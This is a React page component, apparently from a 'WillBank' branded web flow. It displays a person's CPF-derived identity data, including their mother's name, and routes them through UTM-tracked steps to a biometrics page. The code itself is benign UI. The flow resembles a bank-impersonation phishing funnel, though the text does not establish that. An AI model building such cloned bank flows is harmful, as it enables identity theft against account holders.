import { useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Shield } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";
import { saveSession, getSession, clearSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";

const ConfirmaDados = () => {
  const navigate = useNavigate();
  const location = useLocation();

  // Try to get cpfData from location state or session
  const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Save session
    saveSession({ cpfData, currentStep: "/confirma-dados" });
  }, [cpfData, navigate]);

  const handleConfirmar = () => {
    navigate(buildUrlWithUtm("/biometria"), { state: { cpfData } });
  };

  const handleCorrigir = () => {
    clearSession();
    navigate("/");
  };

  if (!cpfData) return null;

  const dataFields = [
    { label: "Nome completo", value: cpfData.nome },
    { label: "Data de nascimento", value: cpfData.dataNascimento },
    { label: "Nome da mãe", value: cpfData.nomeMae },
    { label: "CPF", value: cpfData.cpf },
    { label: "Sexo", value: cpfData.sexo },
  ];

  return (
    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
      <WillBankHeader userName={cpfData.nome.split(' ')[0].toUpperCase()} />

      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
        <WillBankCard className="w-full max-w-lg">
          <div className="space-y-6">
            <div className="text-center space-y-2">
              <h1 className="text-xl sm:text-2xl font-bold text-foreground tracking-tight">
                Confirme se você é essa pessoa
              </h1>
              <p className="text-muted-foreground text-sm">
                Verifique se os dados estão corretos antes de continuar.
              </p>
            </div>

            {/* Data Fields */}
            <div className="border-2 border-border/60 rounded-xl divide-y divide-border/40 overflow-hidden shadow-sm">
              {dataFields.map((field, index) => (
                <div key={index} className="p-3 sm:p-4 text-center bg-card hover:bg-muted/30 transition-colors">
                  <p className="text-xs text-muted-foreground font-medium underline decoration-dotted underline-offset-4">{field.label}</p>
                  <p className="font-bold text-foreground mt-1 text-sm sm:text-base">{field.value}</p>
                </div>
              ))}
            </div>

            {/* Action Buttons */}
            <div className="space-y-3">
              <Button 
                onClick={handleConfirmar}
                className="w-full h-12 sm:h-14 text-sm sm:text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground rounded-full shadow-lg hover:shadow-xl transition-all duration-300"
              >
                Sim, sou eu
              </Button>
              
              <Button 
                onClick={handleCorrigir}
                variant="outline"
                className="w-full h-10 sm:h-12 text-sm font-semibold rounded-full border-2 hover:bg-muted/50 transition-all duration-200"
              >
                Não sou eu, corrigir dados
              </Button>
            </div>

            {/* Security Badge */}
            <div className="flex items-center justify-center gap-2 text-muted-foreground pt-2">
              <div className="p-1.5 bg-primary/10 rounded-full">
                <Shield className="w-3.5 h-3.5 text-primary" />
              </div>
              <span className="text-[11px] sm:text-sm font-medium">Dados consultados de forma segura e oficial</span>
            </div>
          </div>
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default ConfirmaDados;
